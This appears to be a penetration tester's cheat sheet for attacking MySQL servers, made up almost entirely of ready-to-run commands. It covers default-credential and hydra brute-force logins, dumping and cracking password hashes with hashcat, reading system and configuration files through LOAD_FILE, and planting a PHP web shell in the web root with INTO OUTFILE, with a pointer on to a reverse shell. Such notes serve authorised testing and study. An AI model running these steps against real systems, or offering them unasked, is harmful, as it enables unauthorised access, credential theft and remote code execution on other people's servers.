# MySQL enumeration

## Version and empty passwords
sudo nmap -sV -p 3306 --script mysql-info,mysql-empty-password <TargetIP>

## Log in
mysql -h <TargetIP> -u '<Username>' -p'<Password>'
mysql -h <TargetIP> -u root -p
- [ ] root with no password, root, toor and the application's name tried
- [ ] Another port: -P <Port>
A TLS error from an old server, with Kali's MariaDB client:
mysql -h <TargetIP> -u '<Username>' -p'<Password>' --skip-ssl
- [ ] The Oracle MySQL client takes --ssl-mode=DISABLED instead
No password at all yet:
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 mysql://<TargetIP>
One query straight from Kali:
mysql -h <TargetIP> -u '<Username>' -p'<Password>' -e 'SHOW DATABASES;'

## Who I am and what is here
SELECT user(), current_user(), @@version, @@hostname;
SHOW GRANTS;
SHOW DATABASES;
USE <Database>;
SHOW TABLES;
SELECT * FROM <Table> LIMIT 20;
- [ ] Users and passwords in the application's tables, each tried on SSH, the web login and every other service
- [ ] FILE or ALL PRIVILEGES in SHOW GRANTS: files can be read and written below

## Password hashes
SELECT user, host, authentication_string, plugin FROM mysql.user;
- [ ] mysql_native_password hashes go to hashcat without their leading *
hashcat -m 300 mysql.hash /usr/share/wordlists/rockyou.txt

## Read and write files
SHOW VARIABLES LIKE 'secure_file_priv';
- [ ] Empty: any path. A folder: only that one. NULL: no file reads or writes at all
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
A test file into the web root first:
SELECT 'proof' INTO OUTFILE '/var/www/html/proof.txt';
curl -s '<Scheme>://<WebHost>/proof.txt'
- [ ] It is there: a PHP shell the same way
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php';
curl -s '<Scheme>://<WebHost>/cmd.php?cmd=id'
- [ ] INTO OUTFILE never overwrites: a new name each time
- [ ] Commands run: a reverse shell, :Pb shells
